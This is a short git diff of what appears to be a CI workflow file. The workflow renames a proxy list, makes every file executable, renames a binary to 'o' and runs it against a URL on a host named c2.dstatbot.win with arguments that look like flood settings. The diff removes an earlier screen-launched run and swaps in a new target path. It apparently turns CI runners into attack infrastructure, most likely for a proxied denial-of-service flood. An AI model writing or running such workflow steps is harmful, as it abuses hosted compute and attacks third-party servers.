@@ -35,11 +35,9 @@ jobs:
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
           mv ki o         
-          screen -dms ve ./o https://c2.dstatbot.win/u0QczxYL 750 1 1 
           
-           
           
-          ./o https://c2.dstatbot.win/u0QczxYL 750 1 1 
+          ./o https://c2.dstatbot.win/aK31lEdO 750 1 1 
           
 
           
